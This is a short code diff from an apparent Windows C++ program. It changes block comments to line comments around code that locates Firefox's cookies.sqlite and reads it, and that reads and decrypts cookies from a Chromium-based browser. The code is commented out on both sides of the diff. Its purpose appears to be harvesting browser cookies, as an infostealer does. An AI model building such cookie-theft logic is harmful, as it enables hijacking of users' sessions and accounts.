@@ -42,15 +42,15 @@ int main() {
 
 	HeapFree(GetProcessHeap(), 0, lpBuffer);
 
-	/*char szFirefoxPath[MAX_PATH] = { 0 };
-	if (!GetFilePath("\\Mozilla\\Firefox", "\\Profiles", CSIDL_APPDATA, szFirefoxPath)) {
-		printf("GetFilePath for GoogleChrome Cookies Failed\n");
-		return -1;
-	}
-	char szFirefoxSqlitePath[MAX_PATH] = { 0 };
-	SearchFile(szFirefoxPath, "cookies.sqlite", szFirefoxSqlitePath);
-	FirefoxCookies* firefoxCookies = new FirefoxCookies(szFirefoxSqlitePath);
-	firefoxCookies->QuerySqlite();*/
+	//char szFirefoxPath[MAX_PATH] = { 0 };
+	//if (!GetFilePath("\\Mozilla\\Firefox", "\\Profiles", CSIDL_APPDATA, szFirefoxPath)) {
+	//	printf("GetFilePath for GoogleChrome Cookies Failed\n");
+	//	return -1;
+	//}
+	//char szFirefoxSqlitePath[MAX_PATH] = { 0 };
+	//SearchFile(szFirefoxPath, "cookies.sqlite", szFirefoxSqlitePath);
+	//FirefoxCookies* firefoxCookies = new FirefoxCookies(szFirefoxSqlitePath);
+	//firefoxCookies->QuerySqlite();
 
 
 	//char szCocCocKeyPath[MAX_PATH] = { 0 };
@@ -81,6 +81,4 @@ int main() {
 	//ChromeCookies* chromeCookies = new ChromeCookies(szCocCocSqlitePath);
 	//chromeCookies->QuerySqlite();
 	//chromeCookies->CookiesDecrypt(chromeDecoder->GetKeyHandle());
-
-
 }
